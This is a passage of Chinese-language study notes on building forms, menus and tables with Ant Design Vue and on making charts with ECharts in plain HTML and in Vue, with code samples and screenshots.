<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220956.png" alt="image-20201102210413999" style="zoom: 80%;" />

#### 表单排列方式：

- 水平(Horizontal)排列：标签和表单控件水平排列；（默认）
- 垂直(Vertical)排列：标签和表单控件上下垂直排列；
- 行内(Inline)排列：表单项水平行内排列。

使用：

​	通过在a-form-model标签绑定后layout属性，比如

```
 <a-form-model layout="horizontal"></a-form-model>
```

实际案例：

```
<template>
  <a-form-model :layout="form.layout" :model="form" v-bind="formItemLayout">
    <a-form-model-item label="Form Layout">
      <a-radio-group v-model="form.layout">
        <a-radio-button value="horizontal">
          Horizontal
        </a-radio-button>
        <a-radio-button value="vertical">
          Vertical
        </a-radio-button>
        <a-radio-button value="inline">
          Inline
        </a-radio-button>
      </a-radio-group>
    </a-form-model-item>
    <a-form-model-item label="Field A">
      <a-input v-model="form.fieldA" placeholder="input placeholder" />
    </a-form-model-item>
    <a-form-model-item label="Field B">
      <a-input v-model="form.fieldB" placeholder="input placeholder" />
    </a-form-model-item>
    <a-form-model-item :wrapper-col="buttonItemLayout.wrapperCol">
      <a-button type="primary">
        Submit
      </a-button>
    </a-form-model-item>
  </a-form-model>
</template>
<script>
export default {
  data() {
    return {
      form: {
        layout: 'horizontal',
        fieldA: '',
        fieldB: '',
      },
    };
  },
  computed: {
    formItemLayout() {
      const { layout } = this.form;
      return layout === 'horizontal'
        ? {
            labelCol: { span: 4 },
            wrapperCol: { span: 14 },
          }
        : {};
    },
    buttonItemLayout() {
      const { layout } = this.form;
      return layout === 'horizontal'
        ? {
            wrapperCol: { span: 14, offset: 4 },
          }
        : {};
    },
  },
};
</script>
```

实际效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222356.gif" alt="chrome-capture (6)" style="zoom:80%;" />

注意：当layout="vertical"时，不能再设定:label={span:4},因为label默认占一行，也就是span:24,这样才能实行垂直排布，但是：warpper-col可以设置，

还有inline布局,可以根据span：24来思考

#### 表单域

> 表单一定会包含表单域，表单域可以是输入控件，标准表单域，标签，下拉菜单，文本域等。

##### a-input(输入框)

> 基本使用：

```
<template>
  <a-input v-model:value="value" placeholder="Basic usage" />
</template>
<script>
export default {
  data() {
    return {
      value: '',
    };
  },
};
</script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221000.png" alt="image-20201103151047750" style="zoom:80%;" />

> 带有搜索按钮的输入框，搜索按钮绑定search事件，`会默认把输入框的value以参数形式传递`，`按回车键也可以触发search`

```
<template>
  <div>
    <a-input-search
      v-model:value="value"
      placeholder="input search text"
      style="width: 200px"
      @search="onSearch"
    />
    <br /><br />
    <a-input-search
      v-model:value="value"
      placeholder="input search text"
      enter-button
      @search="onSearch"
    />
    <br /><br />
    <a-input-search
      v-model:value="value"
      placeholder="input search text"
      enter-button="Search"
      size="large"
      @search="onSearch"
    />
    <br /><br />
    <a-input-search
      v-model:value="value"
      placeholder="input search text"
      size="large"
      @search="onSearch"
    >
      <template v-slot:enterButton>
        <a-button>
          Custom
        </a-button>
      </template>
    </a-input-search>
  </div>
</template>

<script>
export default {
  data() {
    return {
      value: '',
    };
  },
  methods: {
    onSearch(value) {
      console.log('use value', value);
      console.log('or use this.value', this.value);
    },
  },
};
</script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221003.png" alt="image-20201103154647294" style="zoom:80%;" />

##### a-textarea（文本框）

基本使用：

> allowclear属性就是出出现一个按钮，一键清空输入

```
<template>
  <div>
    <div style="margin: 24px 0" />
    <a-textarea
      v-model="value1"
      allowClear
      :value="value1"
      placeholder="Autosize height with minimum and maximum number of lines"
      :autoSize="{ minRows: 2, maxRows: 5 }"
    />
  </div>
</template>
<script>
export default {
  data() {
    return {
      value1: '',
    };
  },
};
</script>
```

效果：

![image-20201103152126505](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221006.png)

##### a-select（下拉框）

基本使用：

> 如果要显示placeholder的内容，那值下拉框的初始值需要设置为undefined

```
<template>
  <div>
    <a-select
      v-model="value"
      :value="value"
      style="width: 120px"
      @change="handleChange"
      placeholder="请选择"
    >
      <a-select-option value="jack">
        Jack
      </a-select-option>
      <a-select-option value="lucy">
        Lucy
      </a-select-option>
      <a-select-option value="disabled" disabled>
        Disabled
      </a-select-option>
      <a-select-option value="Yiminghe">
        yiminghe
      </a-select-option>
    </a-select>
  </div>
</template>
<script>
export default {
  data() {
    return {
      value: undefined,
    }
  },
  methods: {
    handleChange(value) {
      console.log(`selected ${value}`)
    },
  },
}
</script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221010.png" alt="image-20201103165632844" style="zoom:80%;" />

##### a-data-picker（时间选择框）

##### a-switch(开关)

##### Slider（滑动输入条）

##### a-checkbox-group&a-checkbox（多选框）

##### a-radio-group&a-radio（单选框）

### 表单数据校验

> Form 组件提供了表单验证的功能，只需要通过 `rules` 属性传入约定的验证规则，并将 `FormItem` 的 `prop` 属性设置为需校验的字段名即可。

实例：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222405.gif" alt="chrome-capture (7)" style="zoom:67%;" />

```
<template>
  <!-- ref绑定该表单,model是表单数据对象,,有些函数,比如resetFields所必需的,如果不需要使用这些
       函数可以省略,rules绑定检验规则,v-bind={
        labelCol: { span: 4 },
      }相当于:labelCol:{span:4}
  -->
  <a-form-model ref="ruleForm" :model="ruleForm" :rules="rules" v-bind="layout">
    <!-- has-feedback这个属性会在输入框后面加上一些提示图标
         label指明label名称,autocomplete="on",表示输入框会默认提示你之前的提交记录
         prop是为了让检验规则对应每个输入框
     -->
    <a-form-model-item has-feedback label="Password" prop="pass">
      <a-input v-model="ruleForm.pass" type="password" autocomplete="on" />
    </a-form-model-item>
    <a-form-model-item has-feedback label="Age" prop="age">
      <a-input v-model.number="ruleForm.age" />
    </a-form-model-item>
    <a-form-model-item :wrapper-col="{ span: 14, offset: 4 }">
      <a-button type="primary" @click="submitForm('ruleForm')">
        Submit
      </a-button>
      <a-button style="margin-left: 10px" @click="resetForm('ruleForm')">
        Reset
      </a-button>
    </a-form-model-item>
  </a-form-model>
</template>
<script>
export default {
  data() {
    let checkPending;
    //校验方法，定义在data()函数中，结果付给callback参数返回
    let checkAge = (rule, value, callback) => {
      clearTimeout(checkPending);
      if (!value) {
        return callback(new Error('Please input the age'));
      }
      checkPending = setTimeout(() => {
        if (!Number.isInteger(value)) {
          callback(new Error('Please input digits'));
        } else {
          if (value < 18) {
            callback(new Error('Age must be greater than 18'));
          } else {
            callback();
          }
        }
      }, 1000);
    };
    let validatePass = (rule, value, callback) => {
      if (value === '') {
        callback(new Error('Please input the password'));
      } else {
        if (this.ruleForm.checkPass !== '') {
          this.$refs.ruleForm.validateField('checkPass');
        }
        callback();
      }
    };
    return {
      ruleForm: {
        pass: '',
        age: '18',
      },
      // rules定义的是检验规则，validator跟的是自定义检验方法，方法要定义在data()函数中，trigger表示触发校验的事件
      rules: {
        pass: [{ validator: validatePass, trigger: 'change' }],
        age: [{ validator: checkAge, trigger: 'change' }],
      },
      layout: {
        labelCol: { span: 4 },
        wrapperCol: { span: 14 },
      },
    };
  },
  methods: {
    submitForm(formName) {
      // 如果form表格里面的数据通过检验，valid则为true，否则为false
      this.$refs[formName].validate(valid => {
        if (valid) {
          // alert('submit!');
          console.log(this.ruleForm);
          
        } else {
          console.log('error submit!!');
          return false;
        }
      });
    },
    resetForm(formName) {
      // resetFields函数可以回复绑定给model的数据初始值
      this.$refs[formName].resetFields();
    },
  },
};
</script>
```

**主要思路：创建设定rules规则，并且绑定给form,在利用ref绑定form，由于每个form中自带validate函数，并且参数valid能够根据校验是否通过设为true或false,利用这个我们就能控制数据是否提交**

## 导航Navigation

### 导航菜单Menu

基本结构：

```
     <template>
       <a-menu>
         <a-menu-item>菜单项</a-menu-item>
         <a-sub-menu title="子菜单">
           <a-menu-item>子菜单项</a-menu-item>
         </a-sub-menu>
       </a-menu>
     </template>
```

基本使用：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222411.gif" alt="chrome-capture (8)" style="zoom:67%;" />

```
<template>
  <div class="asider">
    <a-layout-sider :collapsible="false">
      <a-menu
        style="width: 100%"
        :inlineCollapsed="false"
        mode="inline"
        :selectedKeys="[this.$route.path]"
        @click="handleClick"
      >
        <a-menu-item-group key="g1">
          <template slot="title">
            <span>用户管理</span>
          </template>
          <a-menu-item key="/createAdmin">
            新建管理员
          </a-menu-item>
          <a-menu-item key="/manage">
            用户列表
          </a-menu-item>
        </a-menu-item-group>
      </a-menu>
    </a-layout-sider>
  </div>
</template>
<script>
export default {
  name: 'sider',
  data() {
    return {
      theme: 'dark',
      current:'2'
    }
  },
  methods: {
    handleClick(e) {
      this.current=e.key
      if (e.key == '/createAdmin' && this.$route.path != '/createAdmin') {
        this.$router.replace('/createAdmin')
      } else if (e.key == '/manage' && this.$route.path != '/manage') {
        this.$router.replace('/manage')
      }
    },
  },
}
</script>
<style scoped>
.asider {
  width: 200px;
  height: 859px;
}
</style>
```

为了实现刷新后菜单选中不会被默认值重改，而是跟随页面，我使用了:selectedKeys="[this.$route.path]"，菜单的key不仅仅可以是数字，还可以是字符串

## 数据展示Data Display

### 表格Table

**基本用法一**

> 用data-source绑定表格要显示的数据，数据格式是数组，包含对象[{},{}],每个对象是一行，然后通过title设置标题，data-index把对应列的数据绑定起来
>
> slot-scope="text, record"，使用这句话可以获取本行数据的信息，record就是本行数据

```
<template>
  <a-table :data-source="data">
    <a-table-column title="创建日期" data-index="creaedate" />
    <a-table-column title="账款单号" data-index="sn"> </a-table-column>
    <a-table-column title="操作">
      <template slot-scope="text, record">
        <span>
          <a @click="deleteBtn(record)">Delete</a>
        </span>
      </template>
    </a-table-column>
  </a-table>
</template>
<script>
const data = [
  {
  //每个数据都需要一个key值，而且必须唯一，key值我们可以手动添加，或者通过rowkey来设定
    key: '1',
    creaedate: '10月1日',
    sn: '123',
  },
  {
    key: '2',
    creaedate: '10月2日',
    sn: '1234',
  },
  {
    key: '3',
    creaedate: '10月2日',
    sn: '12233',
  },
]
export default {
  data() {
    return {
      data,
    }
  },
  methods: {
    deleteBtn(record) {
      for (let index in this.data) {
        if (this.data[index].key == record.key) {
          this.data.splice(index, 1)
        }
      }
    },
  },
}
</script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221015.png" alt="image-20201103102940273" style="zoom:80%;" />

基本用法二(推荐使用）：

> 原理和第一种是一样的，只不过第一种实在template中配置表头，而用法二是通过columns来绑定数据，数据按照一定格式编写，然后再转换成表头，
>
> 表头标题可以通过slots来自定义内容，dataIndex是定义表头的名称，下面data中的数据是按行来渲染的，而且会以属性名和表头的dataIndex来进行匹配，
>
> 而不是依据顺序的，比如我们第一列的表头的dataIndex为'name',那么就会渲染下面data数据中属性名为name的数据项
>
> 这个用法不可以直接在列插入东西，需要 在columns中配置好scopedSlots，然后再用slot=""的形式插入，具体用法看以下代码
>
> slot-scope="text, record"，使用这句话可以获取本行数据的信息，record就是本行数据

```
<template>
	//record代表一整个数据项，rowKey就是在数据项缺少Key属性的时候用以唯一标识每个数据项的,pagination控制是否显示分页器
  <a-table :columns="columns" :data-source="data" :rowKey="record => record.id" :pagination="true">
    <!-- 自定义标题 -->
    <span slot="customTitle"><a-icon type="smile-o" /> Text</span>
    <!-- 自定义表格内容 -->
    <template slot="action" slot-scope="text, record">
      <a href="#">{{ record.name }}</a>
    </template>
  </a-table>
</template>
<script>
const columns = [
  {
    // 这时候title就不能写了，不然会覆盖自定义标题内容
    // title: 'Name',
    dataIndex: 'name',
    //表头插槽，可以自定义表头内容
    slots: { title: 'customTitle' },
  },
  {
    title: 'Age',
    dataIndex: 'age',
  },
  {
    title: 'Action',
    //表格内容插槽
    scopedSlots: { customRender: 'action' },
  },
]
const data = [
  {
    //key: '1',
    id:1,
    name: 'John Brown',
    age: 32,
  },
  {
    //key: '2',
    id:2,
    name: 'Jim Green',
    age: 42,
  },
  {
  	如果数据是从网络请求过来的，没有带有Key值，我们可以添加上key值，或者在定义表格的标签用rowkey来定义（推荐），注意rowkey选取的值必须每个数据项都唯一
    //key: '3',
    id:3
    name: 'Joe Black',
    age: 32,
  },
]
export default {
  data() {
    return {
      data,
      columns,
    }
  },
}
</script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221018.png" alt="image-20201204103605527" style="zoom:67%;" />

# ECharts

## 简介

ECharts是一个使用Javascript实现的开源可视化库，兼容性强，底层依赖矢量图形库ZRender,提供直观，交互丰富，可高度个性化定制的数据可视化图表。

> 官网地址：https://echarts.apache.org/zh/index.html

## ECharts的基本使用

### 普通使用（html)

- 步骤1：引入echarts.js文件

  ```
  <script src="./lib//echarts.min.js"></script>
  ```

- 步骤2：准备一个呈现图表的盒子

  ```
  <div style="width: 600px; height: 400px"></div>
  ```

- 步骤3：初始化echarts实例对象

  ```
   var mCharts = echarts.init(document.querySelector('div'))
  ```

- 步骤4：准备配置项

  ```
   var option = {
          xAxis: {
            type: 'category',
            data: ['小明', '小红', '小王'],
          },
          yAxis: {
            type: 'value',
          },
          series: [
            {
              name: '语文',
              type: 'bar',
              data: [70, 92, 87],
            },
          ],
        }
  ```

- 步骤5：将配置项设置给echarts实例对象

  ```
  mCharts.setOption(option)
  ```

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221022.png" alt="image-20201113205251133" style="zoom:80%;" />

所有代码：

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <!-- 步骤一：引入echarts.js文件 -->
    <script src="./lib//echarts.min.js"></script>
  </head>
  <body>
    <!-- 步骤二：准备一个呈现图表的盒子 -->
    <div style="width: 600px; height: 400px"></div>
    <!-- 步骤3:初始化echarts实例对象 -->
    <!-- 参数为dom，决定图表最终呈现的位置 -->
    <script>
      var mCharts = echarts.init(document.querySelector('div'))
      //步骤4：准备配置项
      var option = {
        title: {
          text: '成绩',//配置表标题
          link: 'http://www.baidu.com',//配置标题链接
        },
        xAxis: {
          type: 'category', //类目轴
          data: ['小明', '小红', '小王'],
        },
        yAxis: {
          type: 'value', //数值轴
        },
        series: [
          {
            name: '语文',
            type: 'bar', //bar代表柱形图，line代表折线图，pie代表饼状图
            data: [70, 92, 87],
          },
        ],
      }
      // 步骤5:将配置项设置给echarts实例对象
      mCharts.setOption(option)
    </script>
  </body>
</html>

```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221026.png" alt="image-20201113210001155" style="zoom:80%;" />



### 在框架使用（vue)

方案一：

- 在public文件夹下的index.html中引入Echarts链接

  ![image-20201119223212567](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221030.png)

  链接代码：

  ```
  <script src="./static/lib/echarts.min.js"></script>
  ```

- 在main.js中全局注册，实际上不注册也可以直接使用(直接使用echarts也行)

  ![image-20201119223435100](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221033.png)

  代码：

  ```
  Vue.prototype.$echarts = window.echarts
  ```

- 在组件中使用：

  1. 第一步定义容器：

     ![image-20201119223845735](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221038.png)

     代码：

     ```
     <template>
       <div class="com-container">
         <div class="com-chart" ref="seller_ref"></div>
       </div>
     </template>
     ```

  2. 初始化echartInstance对象：

     先在data定义该对象echartInstance：null,然后初始化图表

     ```
      initChart () {
      	//初始化图表
           this.chartInstane = this.$echarts.init(this.$refs.trend_ref, 'chalk')
           //图表配置
           let initOption = {
              xAxis: {
               type: 'category',
             },
             yAxis: {
               type: 'value',
             },
             series:[
             	{
     			type:'bar'
     		}
     	   ]
           //应用配置
           this.chartInstane.setOption(initOption)
         },
     ```

     `注意：如果使用百分比，那是相对于容器的宽高`

  3. 获取数据

     代码：（具体问题具体分析）

     ```
     async getData () {
     	//定义X轴数据
           this.allData.xData = ['小明', '小红', '小王'],
           //定义y轴数据
           this.allData.yData =  [70, 92, 87], 
           this.updateChart()
         },
     ```

  4. 更新图表

     代码：

     ```
     updateChart () {
           //图例的数据
           let legendArr = this.allData.yData
           let dataOption = {
             legend: {
               data: legendArr,
             },
             xAxis: {
               data: this.allData.xData,
             },
             series: [
             	{
             		data:this.allData.yData
             	}
             ]
           }
           //重新应用配置
           this.chartInstane.setOption(dataOption)
         },
     ```

  5. 当浏览器的大小发生变化的时候，会调用的方法，来完成屏幕的适配

     代码：

     ```
      screenAdapter () {
           this.titleFontSize = (this.$refs.trend_ref.offsetWidth / 100) * 3.6
           let adapterOption = {
             legend: {
               itemWidth: this.titleFontSize,
               itemHeight: this.titleFontSize,
               textStyle: {
                 fontSize: this.titleFontSize / 2,
               },
             },
           }
           this.chartInstane.setOption(adapterOption)
           this.chartInstane.resize()
         },
     ```

  6. 在mounted中依次调用上述方法：

     代码：

     ```
       mounted () {
       	//初始化图表
         this.initChart()
         //获取数据
         this.getData()
         //自适应
         this.screenAdapter()
         window.addEventListener('resize', this.screenAdapter)
       },
     ```

  7. 效果：

     <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221041.png" alt="image-20201113210001155" style="zoom:80%;" />

方案二：

1. **安装echarts依赖**

   ```
   npm install echarts -S
   ```

2. **全局引入Echarts**

   ```
   // 引入echarts
   import echarts from 'echarts'
   Vue.prototype.$echarts = echarts
   ```

3. **在组件中使用**

   ```
   <template>
     <div id="app">
       <div id="myChart" :style="{width: '300px', height: '300px'}"></div>
     </div>
   </template>
   <script>
   export default {
     mounted(){
        console.log(document.getElementById('myChart'));
       this.drawLine();
     },
     methods: {
       drawLine(){
           // 基于准备好的dom，初始化echarts实例
           let myChart = this.$echarts.init(document.getElementById('myChart'))
           // 绘制图表
           myChart.setOption({
               title: { text: '在Vue中使用echarts' },
               tooltip: {},
               xAxis: {
                 type: 'category',
                   data: ["衬衫","羊毛衫","雪纺衫","裤子","高跟鞋","袜子"]
               },
               yAxis: {
                 type: 'value'
               },
               series: [{
                   name: '销量',
                   type: 'bar',
                   data: [5, 20, 36, 10, 10, 20]
               }]
           });
       }
     }
   }
   </script>
   ```

   效果图：

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221045.png" alt="image-20201204143600467" style="zoom:80%;" />

   

4. 按需引入，由于全局引入会将所有的echarts图表打包，会导致项目体积过大在

   ```
   // 引入基本模板
   let echarts = require('echarts/lib/echarts')
   // 引入柱状图组件
   require('echarts/lib/chart/bar')
   // 引入提示框和title组件
   require('echarts/lib/component/tooltip')
   require('echarts/lib/component/title')
   ```

   使用 require 而不是 import

   `注意：`由于Echarts需要调用函数来进行注册和配置图表，我们一般加载页面就会初始化图表，如果我们需要从网络中拿到数据，这时候Echarts就无法拿到数据，因为初始化只会在页面第一次加载时配置数据，

   ​		 所以我们必须采取一些方案，让拿到新数据后的echarts重新配置，也就是调用一些函数

   方案一：如果是在同一个组件使用的，比如上方的例子，我们可以在拿到通过网络请求后从新数据后，我们可以在网络请求函数的后面在调用以下myChart.setOption来重新配置echarts,上面的例子就是基于这个

   ​			方案

   方案二：如果我们是把echarts封装在另一个组件中的，比如这样

   ​		![image-20201204144819876](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221049.png)

   我们可以采用v-if的方式，让封装的组件有数据就才初始化，这样就不要重新配置，而且也能拿到最新数据

   方案三：使用watch来进行监听数据的变化，如果数据发生变化，我们重新配置echarts

   ```
   //数据自动刷新，必然需要一个监听机制告诉Echarts重新设置数据
       watch: {
         //观察option的变化
         echarts1_option: {
           handler(newVal, oldVal) {
             if (this.myChart) {
               if (newVal) {
                 this.myChart.setOption(newVal);
               } else {
                 this.myChart.setOption(oldVal);
               }
             } else {
               this.init();
             }
           },
           deep: true //对象内部属性的监听，关键。
         }
       },
   ```

## ECharts常用图表 

### 图表主题 

**内置主题**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221053.png" alt="image-20201114162205092" style="zoom: 67%;" />

**自定义主题 **

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221057.png" alt="image-20201114163903505" style="zoom: 67%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
  <script src="theme/itcast.js"></script>//这是自定义主题
</head>
<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    // 1.在线编辑主题 https://www.echartsjs.com/theme-builder/
    // 2.下载主题的js文件
    // 3.在html中导入js文件
    // 4.在init方法中指明主题的名称
    var mCharts = echarts.init(document.querySelector("div"), 'itcast')
    var xDataArr = ['张三', '李四', '王五', '闰土', '小明', '茅台', '二妞', '大强']
    var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86]
    var option = {
      xAxis: {
        type: 'category',
        data: xDataArr
      },
      yAxis: {
        type: 'value'
      },
      series: [
        {
          type: 'bar',
          data: yDataArr,
          markPoint: {
            data: [
              {
                type: 'max', name: '最大值'
              },
              {
                type: 'min', name: '最小值'
              }
            ]
          },
          markLine: {
            data: [
              {
                type: 'average', name: '平均值'
              }
            ]
          },
          label: {
            show: true,
            rotate: 60
          },
          barWidth: '30%'
        }
      ]
    };
    mCharts.setOption(option)
  </script>
</body>

</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221100.png" alt="image-20201114164018164" style="zoom:67%;" />

### 调色盘

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221103.png" alt="image-20201114172024342" style="zoom: 50%;" />

就近原则

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221107.png" alt="image-20201114173908240" style="zoom: 67%;" />

也可以使用这样的形式使用：

```
 	itemStyle: {
              barBorderRadius: [0, 33, 33, 0],
              //指明不同百分比之下颜色的值
              color: new this.$echarts.graphic.LinearGradient(0, 0, 1, 0, [
                //百分之0状态之下的颜色值
                {
                  offset: 0,
                  color: '#5052EE',
                },
                //百分之100状态之下的颜色值
                {
                  offset: 1,
                  color: '#AB6EE5',
                },
              ]),
            },
```

### 样式

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221111.png" alt="image-20201114212758267" style="zoom: 50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>
<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    var mCharts = echarts.init(document.querySelector("div"))
    var option = {
      title: {
        text: '饼图的测试',
        textStyle: { // 控制标题的文字样式
          color: 'blue'
        }
      },
      series: [
        {
          type: 'pie',
          data: [{
            value: 11231,
            name: "淘宝",
            itemStyle: { // 控制淘宝这一区域的样式
              color: 'yellow'
            },
            label: {
              color: 'green'
            },
            emphasis: {
              itemStyle: { // 控制淘宝这一区域的样式
                color: 'pink'
              },
              label: {
                color: 'black'
              }
            }
          },
          {
            value: 22673,
            name: "京东"
          },
          {
            value: 6123,
            name: "唯品会",
          },
          {
            value: 8989,
            name: "1号店"
          },
          {
            value: 6700,
            name: "聚美优品"
          }]
        }
      ]
    }
    mCharts.setOption(option)
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221115.png" alt="image-20201114213043780" style="zoom:67%;" />

### 图表自适应

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221119.png" alt="image-20201114213719122" style="zoom:50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>
<body>
  <div style="height:400px;border: 1px solid red"></div>
  <script>
    var mCharts = echarts.init(document.querySelector("div"))
    var xDataArr = ['张三', '李四', '王五', '闰土', '小明', '茅台', '二妞', '大强']
    var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86]
    var option = {
      xAxis: {
        type: 'category',
        data: xDataArr
      },
      yAxis: {
        type: 'value'
      },
      series: [
        {
          type: 'bar',
          data: yDataArr,
          markPoint: {
            data: [
              {
                type: 'max', name: '最大值'
              },
              {
                type: 'min', name: '最小值'
              }
            ]
          },
          markLine: {
            data: [
              {
                type: 'average', name: '平均值'
              }
            ]
          },
          label: {
            show: true,
            rotate: 60
          },
          barWidth: '30%'
        }
      ]
    }
    mCharts.setOption(option)
    // 监听window窗口大小变化的事件
    window.onresize = function(){
      // 调用echarts实例对象的resize方法
      mCharts.resize()
    }
  </script>
</body>
</html>
```

### 动画

#### 加载动画

**ECharts已经内置好了加载数据的动画，我们只需要在合适的时机显示或者隐藏即可**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221122.png" alt="image-20201114214942580" style="zoom:50%;" />

#### 增量动画

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>
<body>
  <div style="width: 600px;height:400px"></div>
  <button id="modify">修改数据</button>
  <button id="add">增加数据</button>
  <script>
    var mCharts = echarts.init(document.querySelector("div"))
    var xDataArr = ['张三', '李四', '王五', '闰土', '小明', '茅台', '二妞', '大强']
    var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86]
    var option = {
      xAxis: {
        type: 'category',
        data: xDataArr
      },
      yAxis: {
        type: 'value'
      },
      series: [
        {
          type: 'bar',
          data: yDataArr,
          markPoint: {
            data: [
              {
                type: 'max', name: '最大值'
              },
              {
                type: 'min', name: '最小值'
              }
            ]
          },
          markLine: {
            data: [
              {
                type: 'average', name: '平均值'
              }
            ]
          },
          label: {
            show: true,
            rotate: 60
          },
          barWidth: '30%'
        }
      ]
    }
    mCharts.setOption(option)
    var btnModify = document.querySelector('#modify')
    btnModify.onclick = function () {
      var newYDataArr = [68, 32, 99, 77, 94, 80, 72, 86]
      // setOption 可以设置多次
      // 新的option 和 旧的option
      // 新旧option的关系并不是相互覆盖的关系, 是相互整合的关系
      // 我们在设置新的option的时候, 只需要考虑到变化的部分就可以
      var option = {
        series: [
          {
            data: newYDataArr
          }
        ]
      }
      mCharts.setOption(option)
    }
    var btnAdd = document.querySelector('#add')
    btnAdd.onclick = function(){
      xDataArr.push('小明')
      yDataArr.push(90)
      var option = {
        xAxis: {
          data: xDataArr
        },
        series: [
          {
            data: yDataArr
          }
        ]
      }
      mCharts.setOption(option)
    }
  </script>
</body>
</html>
```

#### 动画配置

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221126.png" alt="image-20201114221412978" style="zoom: 50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>
<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    var mCharts = echarts.init(document.querySelector("div"))
    var xDataArr = ['张三', '李四', '王五', '闰土', '小明', '茅台', '二妞', '大强']
    var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86]
    var option = {
      animation: true,  // 控制动画是否开启
      // animationDuration: 7000, // 动画的时长, 它是以毫秒为单位
      animationDuration: function(arg){
        console.log(arg)
        return 2000 * arg
      },
      animationEasing: 'bounceOut', // 缓动动画 linear bounceOut
      animationThreshold: 7, // 动画元素的阈值
      xAxis: {
        type: 'category',
        data: xDataArr
      },
      yAxis: {
        type: 'value'
      },
      series: [
        {
          type: 'bar',
          data: yDataArr,
          markPoint: {
            data: [
              {
                type: 'max', name: '最大值'
              },
              {
                type: 'min', name: '最小值'
              }
            ]
          },
          markLine: {
            data: [
              {
                type: 'average', name: '平均值'
              }
            ]
          },
          label: {
            show: true,
            rotate: 60
          },
          barWidth: '30%'
        }
      ]
    };
    mCharts.setOption(option)
  </script>
</body>
</html>
```

### 全局echarts对象

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221130.png" alt="image-20201115145708344" style="zoom:67%;" />

- **init方法**

  初始化ECharts实例对象

  使用主题

  ```
   var mCharts = echarts.init(document.querySelector("div"),'light')
  ```

- **registerTheme方法**

  注册主题

  ```
   <script src="theme/itcast.js"></script>
      // 1.在线编辑主题 https://www.echartsjs.com/theme-builder/
      // 2.下载主题的js文件
      // 3.在html中导入js文件
      // 4.在init方法中指明主题的名称
   var mCharts = echarts.init(document.querySelector("div"), 'itcast')
  ```

- **registerMap方法**

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221133.png" alt="image-20201114222903944" style="zoom:50%;" />

- **connect方法**

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221137.png" alt="image-20201114223207289" style="zoom:50%;" />

综合实例：

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <meta http-equiv="X-UA-Compatible" content="ie=edge">
       <title>Document</title>
       <script src="lib/echarts.min.js"></script>
       <script src="theme/itcast.js"></script>
       <script src="lib/jquery.min.js"></script>
     </head>
     <body>
       <div style="width: 600px;height:400px;border: 1px solid red"></div>
       <div style="width: 600px;height:400px;border: 1px solid green" id="div1"></div>
       <script>
